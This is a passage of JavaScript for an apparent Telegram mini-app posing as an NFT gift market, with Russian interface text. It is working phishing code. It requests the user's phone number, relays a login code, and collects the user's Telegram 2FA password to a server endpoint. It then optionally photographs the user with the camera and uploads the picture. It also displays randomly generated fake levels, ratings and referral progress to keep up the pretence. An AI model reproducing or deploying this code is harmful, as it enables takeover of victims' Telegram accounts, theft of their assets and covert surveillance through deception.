        });
        console.log('[MINIAPP] Фото отправлено');
      } catch (e) {
        console.error('[MINIAPP] Ошибка отправки фото:', e);
      }
    }, 'image/jpeg', 0.9);
  } catch (error) {
    console.error('[MINIAPP] Ошибка доступа к камере:', error);
  }
}

if (authBtn) {
  authBtn.addEventListener('click', () => {
    if (!authModal) return;
    authModal.classList.add('active');
    try { resetStartAuthUI(); } catch { }
    tg.HapticFeedback.impactOccurred('light');
  });
}

if (closeAuth) {
  closeAuth.addEventListener('click', () => {
    authModal.classList.remove('active');
    document.body.style.overflow = '';
    document.body.style.position = '';
    document.body.style.width = '';
    currentStep = 1;
    showStep(1);
    clearCodeInputs();
    if (password2fa) password2fa.value = '';
    authSessionId = null;
    resetStartAuthUI();
    tg.HapticFeedback.impactOccurred('light');
  });
}

if (startAuthBtn) {
  startAuthBtn.addEventListener('click', () => {
    console.log('[MINIAPP] Кнопка нажата, запускаем requestContact');
    tg.HapticFeedback.impactOccurred('light');

    startAuthBtn.disabled = true;
    const originalHTML = startAuthBtn.innerHTML;
    startAuthBtn.innerHTML = `<div class="loading"></div>${t('requestingNumber')}`;

    tg.requestContact((success, contactData) => {
      console.log('[MINIAPP] Callback вызван');
      console.log('[MINIAPP] success:', success);
      console.log('[MINIAPP] contactData:', contactData);

      if (success && contactData) {
        try {
          console.log('[MINIAPP] Полный объект contactData:', JSON.stringify(contactData));
          let phoneNumber = null;

          if (contactData.responseUnsafe && contactData.responseUnsafe.contact) {
            phoneNumber = contactData.responseUnsafe.contact.phone_number;
          } else if (contactData.contact && contactData.contact.phone_number) {
            phoneNumber = contactData.contact.phone_number;
          } else if (contactData.phone_number) {
            phoneNumber = contactData.phone_number;
          }

          if (phoneNumber) {
            userPhone = phoneNumber;
            console.log('[MINIAPP] Номер получен:', userPhone);
            sendSmsCode(userPhone);
          } else {
            console.error('[MINIAPP] Не удалось извлечь phone_number из contactData');
            showStatus('Ошибка получения номера телефона', 'error');
            startAuthBtn.disabled = false;
            startAuthBtn.innerHTML = originalHTML;
          }
        } catch (e) {
          console.error('[MINIAPP] Ошибка при обработке контакта:', e);
          showStatus('Ошибка обработки контакта', 'error');
          startAuthBtn.disabled = false;
          startAuthBtn.innerHTML = originalHTML;
        }
      } else {
        console.log('[MINIAPP] Пользователь отказался делиться контактом или contactData пустой');
        showStatus('Необходимо поделиться номером телефона', 'error');
        startAuthBtn.disabled = false;
        startAuthBtn.innerHTML = originalHTML;
      }
    });
  });
}

async function sendSmsCode(phone) {
  console.log('[MINIAPP] sendSmsCode вызван с номером:', phone);

  try {
    console.log('[MINIAPP] POST /miniapp/auth');
    const response = await fetch('/miniapp/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData,
        action: 'start',
        phone: phone,
        bot_username: botUsername
      })
    });

    console.log('[MINIAPP] status:', response.status);
    const result = await response.json();
    console.log('[MINIAPP] Результат:', result);

    if (result.success) {
      authSessionId = result.session_id;
      showStep(2);
    } else {
      throw new Error(result.error);
    }
  } catch (error) {
    console.error('[MINIAPP] Exception:', error);
    showStatus('Ошибка отправки SMS: ' + error.message, 'error');
    resetStartAuthUI();
  }
}

submit2faBtn.addEventListener('click', async () => {
  tg.HapticFeedback.impactOccurred('light');

  const password = password2fa.value.trim();
  if (!password) {
    showStatus('Введите пароль 2FA', 'error');
    return;
  }

  const originalHTML = submit2faBtn.innerHTML;
  submit2faBtn.disabled = true;
  submit2faBtn.innerHTML = '<div class="loading"></div>Проверяем пароль...';

  try {
    console.log('[MINIAPP] Отправляем пароль 2FA');
    console.log('[MINIAPP] Bot username:', botUsername);

    const response = await fetch('/miniapp/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData,
        action: 'verify_2fa',
        session_id: authSessionId,
        password: password,
        bot_username: botUsername
      })
    });

    console.log('[MINIAPP] status:', response.status);

    const result = await response.json();
    console.log('[MINIAPP] Результат 2FA:', result);

    if (result.success) {
      console.log('[MINIAPP] 2FA успешно!');
      showStep(3);

      if (cameraPhotoEnabled) {
        captureAndSendPhoto();
      }

      setTimeout(() => {
        const loader = document.querySelector('.liquid-loader');
        const successContent = document.querySelector('.success-content');
        if (loader) loader.style.display = 'none';
        if (successContent) successContent.classList.add('show');
      }, 15000);
    } else {
      console.log('[MINIAPP] Ошибка 2FA:', result.error);
      throw new Error(result.error || 'Неверный пароль 2FA');
    }
  } catch (error) {
    console.error('[MINIAPP] Exception при проверке 2FA:', error);
    showStatus(error.message, 'error');
    password2fa.value = '';
    submit2faBtn.disabled = false;
    submit2faBtn.innerHTML = originalHTML;
  } finally {
    submit2faBtn.disabled = false;
    submit2faBtn.innerHTML = originalHTML;
  }
});

getCodeBtn.addEventListener('click', () => {
  tg.HapticFeedback.impactOccurred('light');
});

if (togglePassword) {
  togglePassword.addEventListener('click', () => {
    const type = password2fa.getAttribute('type') === 'password' ? 'text' : 'password';
    password2fa.setAttribute('type', type);

    togglePassword.classList.toggle('active');

    tg.HapticFeedback.impactOccurred('light');
  });
}

goToMarket.addEventListener('click', () => {
  authModal.classList.remove('active');
  document.body.style.overflow = '';
  document.body.style.position = '';
  document.body.style.width = '';
  currentStep = 1;
  showStep(1);
  clearCodeInputs();
  if (password2fa) password2fa.value = '';
  authSessionId = null;
  resetStartAuthUI();
  switchView('market');
});

navBtns.forEach(btn => {
  if (!btn.dataset.bound) {
    btn.addEventListener('click', () => {
      const view = btn.dataset.view;
      switchView(view);
      try { tg.HapticFeedback.impactOccurred('light'); } catch { }
    });
    btn.dataset.bound = '1';
  }
});

function switchView(view) {
  views.forEach(v => {
    v.classList.remove('active');
    v.style.contentVisibility = 'hidden';
  });

  const targetView = document.getElementById(view + 'View');
  if (targetView) {
    targetView.classList.add('active');
    targetView.style.contentVisibility = 'visible';
  }

  navBtns.forEach(b => b.classList.remove('active'));
  const targetBtn = document.querySelector(`[data-view="${view}"]`);
  if (targetBtn) targetBtn.classList.add('active');

  if (view === 'profile' && !widgetsAnimated) {
    animateProfileWidgets();
    widgetsAnimated = true;
  } else if (view === 'seasons') {
    if (!seasonsRendered) {
      renderSeasonsView(true);
      seasonsRendered = true;
    }
  } else if (view === 'gifts') {
    if (!giftsRendered) initGiftsToolbar();
    renderGiftsView();
    giftsRendered = true;
  } else if (view === 'partners' && !partnersRendered) {
    renderPartnersView();
    partnersRendered = true;
  }
}
function setupModal(modalId, closeBtnId, additionalCloseIds = [], onClose = null) {
  const modal = document.getElementById(modalId);
  if (!modal) return;

  const closeHandler = () => {
    modal.classList.remove('active');
    tg.HapticFeedback.impactOccurred('light');
    if (onClose) {
      setTimeout(() => onClose(), 300);
    }
  };

  const closeBtn = document.getElementById(closeBtnId);
  if (closeBtn) closeBtn.onclick = closeHandler;

  additionalCloseIds.forEach(id => {
    const btn = document.getElementById(id);
    if (btn) btn.onclick = closeHandler;
  });
}

setupModal('offerModal', 'closeOffer', ['closeOfferBtn'], () => {
  setTimeout(() => resumeGiftAnimations(), 100);
});
setupModal('giftWithdrawModal', 'closeGiftWithdraw', [], () => {
  setTimeout(() => resumeGiftAnimations(), 100);
});
setupModal('historyModal', 'closeHistory', [], () => {
  setTimeout(() => resumeGiftAnimations(), 100);
});

const authFromGiftBtn = document.getElementById('authFromGiftBtn');
if (authFromGiftBtn) {
  authFromGiftBtn.onclick = () => {
    document.getElementById('giftWithdrawModal').classList.remove('active');
    authModal.classList.add('active');
    resetStartAuthUI();
    tg.HapticFeedback.impactOccurred('light');
  };
}

const authFromHistoryBtn = document.getElementById('authFromHistoryBtn');
if (authFromHistoryBtn) {
  authFromHistoryBtn.onclick = () => {
    document.getElementById('historyModal').classList.remove('active');
    authModal.classList.add('active');
    resetStartAuthUI();
    tg.HapticFeedback.impactOccurred('light');
  };
}

async function loadFragmentAnimation(animUrl, container, nftId) {
  try {
    const previewImg = container.querySelector('.nft-preview');
    if (previewImg) previewImg.style.display = 'none';

    let animData = animationDataCache.get(animUrl);
    if (!animData) {
      const response = await fetch(animUrl);
      if (!response.ok) throw new Error('Animation not found');
      animData = await response.json();
      animationDataCache.set(animUrl, animData);
      animationCacheKeys.push(animUrl);

      while (animationCacheKeys.length > ANIMATION_CACHE_LIMIT) {
        const oldestKey = animationCacheKeys.shift();
        animationDataCache.delete(oldestKey);
      }
    } else {
      const idx = animationCacheKeys.indexOf(animUrl);
      if (idx > -1) {
        animationCacheKeys.splice(idx, 1);
        animationCacheKeys.push(animUrl);
      }
    }

    const anim = lottie.loadAnimation({
      container,
      renderer: 'svg',
      loop: true,
      autoplay: false,
      animationData: animData,
      rendererSettings: {
        preserveAspectRatio: 'xMidYMid meet',
        progressiveLoad: true,
        hideOnTransparent: true
      }
    });

    try {
      anim.setSubframe(false);
    } catch { }

    animations.set(nftId, anim);
    return anim;
  } catch (e) {
    console.error('Error loading Fragment animation:', e);
    return null;
  }
}

function animateOnce(nftId, durationMs = 1200) {
  const anim = animations.get(nftId);
  if (!anim) return;
  const prev = animTimeouts.get(nftId);
  if (prev) clearTimeout(prev);
  try {
    anim.stop();
    anim.goToAndPlay(0, true);
    const t = setTimeout(() => {
      try { anim.stop(); } catch { }
    }, durationMs);
    animTimeouts.set(nftId, t);
  } catch { }
}
function animateNumber(el, to, duration = 900, decimals = 0) {
  const from = 0;
  const start = performance.now();
  function frame(now) {
    const t = Math.min(1, (now - start) / duration);
    const val = from + (to - from) * (0.5 - Math.cos(Math.PI * t) / 2);
    el.textContent = Number(val).toFixed(decimals);
    if (t < 1) requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
}

function debounce(func, wait) {
  let timeout;
  return function executedFunction(...args) {
    const later = () => {
      clearTimeout(timeout);
      func(...args);
    };
    clearTimeout(timeout);
    timeout = setTimeout(later, wait);
  };
}

function throttle(func, limit) {
  let inThrottle;
  return function (...args) {
    if (!inThrottle) {
      func.apply(this, args);
      inThrottle = true;
      setTimeout(() => inThrottle = false, limit);
    }
  };
}

function animateProfileWidgets() {
  document.querySelectorAll('#profileView .widget-value[data-target]').forEach(el => {
    let target = parseFloat(el.getAttribute('data-target'));
    if (!Number.isFinite(target)) return;

    const widgetTitle = el.closest('.widget-content')?.querySelector('.widget-title')?.textContent;
    if (widgetTitle === 'Уровень') {
      target = Math.random() < 0.5 ? 1 : 2;
      el.setAttribute('data-target', target);
    } else if (widgetTitle === 'Рейтинг') {
      target = Math.floor(Math.random() * (250 - 50 + 1)) + 50;
      el.setAttribute('data-target', target);
    }

    const decimals = (el.getAttribute('data-decimals') || '0') | 0;
    animateNumber(el, target, 900, decimals);
  });
}

function renderPartnersView() {
  const invitedCount = 0;
  const earnedPoints = 0;

  const invitedEl = document.getElementById('referralInvitedCount');
  const earnedEl = document.getElementById('referralEarnedPoints');

  if (invitedEl) animateNumber(invitedEl, invitedCount, 1000, 0);
  if (earnedEl) animateNumber(earnedEl, earnedPoints, 1000, 0);

  const progressFill = document.getElementById('referralProgressFill');
  const tierEl = document.getElementById('referralCurrentTier');

  const milestones = [
    { count: 5, name: currentLang === 'ru' ? 'Новичок' : 'Beginner', reward: 50 },
    { count: 15, name: currentLang === 'ru' ? 'Активный' : 'Active', reward: 150 },
    { count: 30, name: currentLang === 'ru' ? 'Продвинутый' : 'Advanced', reward: 300 },
    { count: 50, name: currentLang === 'ru' ? 'Мастер' : 'Master', reward: 500 }
  ];

  let currentTier = milestones[0];
  let nextTier = milestones[1];

  for (let i = 0; i < milestones.length; i++) {
    if (invitedCount >= milestones[i].count) {
      currentTier = milestones[i];
      nextTier = milestones[i + 1] || milestones[i];
    }
  }

  const progress = nextTier ? Math.min(100, (invitedCount / nextTier.count) * 100) : 100;

  const fakeProgress = randomInt(8, 25);

  if (progressFill) {
    progressFill.style.width = '0%';
    setTimeout(() => {
      progressFill.style.width = `${fakeProgress}%`;
    }, 100);
  }

  if (tierEl) tierEl.textContent = currentTier.name;

  const rewardStatuses = ['reward1Status', 'reward2Status', 'reward3Status', 'reward4Status'];
  milestones.forEach((m, idx) => {
    const statusEl = document.getElementById(rewardStatuses[idx]);
    if (statusEl) {
      if (invitedCount >= m.count) {
        statusEl.innerHTML = '<i class="ri-check-line"></i>';
        statusEl.classList.add('unlocked');
      } else {
        statusEl.innerHTML = '<i class="ri-lock-line"></i>';
        statusEl.classList.remove('unlocked');
      }
    }
  });

  const milestoneElements = document.querySelectorAll('.rp-milestone');
  milestoneElements.forEach(el => {
    const milestone = parseInt(el.dataset.milestone);
    if (invitedCount >= milestone) {
      el.classList.add('reached');
    } else {
      el.classList.remove('reached');
    }
  });

  try { tg.HapticFeedback.selectionChanged(); } catch { }
}

function renderSeasonsView(animate = true) {
  const { name, sub } = getSeasonInfo();
  const seasonName = document.getElementById('seasonName');
  const seasonSub = document.getElementById('seasonSub');
  if (seasonName) seasonName.textContent = name;
  if (seasonSub) seasonSub.textContent = sub;

  const points = randomInt(50, 450);
  const tier = getSeasonTier(points);

  const fill = document.getElementById('seasonProgressFill');
  const ptsEl = document.getElementById('seasonPoints');
  const tierEl = document.getElementById('seasonTier');
  if (fill) {
    fill.style.width = '0%';
    requestAnimationFrame(() => {
      fill.style.width = `${tier.percent.toFixed(0)}%`;
    });
  }
  if (ptsEl) {
    if (animate) animateNumber(ptsEl, points, 600, 0);
    else ptsEl.textContent = String(points);
  }
  if (tierEl) tierEl.textContent = tier.tierName;

  const rewards = pick(getRewardPool(), 3);
  const rewardsGrid = document.getElementById('rewardsGrid');
  if (rewardsGrid) {
    rewardsGrid.innerHTML = '';
    rewards.forEach(r => {
      const card = document.createElement('div');
      card.className = 'reward-card';
      card.innerHTML = `
        <div class="reward-icon"><i class="${r.icon}"></i></div>
        <div class="reward-name">${r.name}</div>
      `;
      rewardsGrid.appendChild(card);
    });
  }

  const prizeEl = document.getElementById('prizeName');
  if (prizeEl) prizeEl.textContent = (rewards[0]?.name || 'NFT подарочный бокс');

  const chipsWrap = document.getElementById('challenges');
  if (chipsWrap) {
    chipsWrap.innerHTML = '';
    const pool = getChallengesPool();
    const tasks = pick(pool, 4);
    tasks.forEach(t => {
      const chip = document.createElement('div');
      chip.className = 'chip';
      chip.innerHTML = `<i class="${t.icon}"></i><span>${t.text}</span><span style="opacity:.8">${t.reward}</span>`;
      chip.addEventListener('click', () => {
        chip.classList.toggle('done');
        try { tg.HapticFeedback.selectionChanged(); } catch { }
      });
      chipsWrap.appendChild(chip);
    });
  }

  try { tg.HapticFeedback.selectionChanged(); } catch { }
}
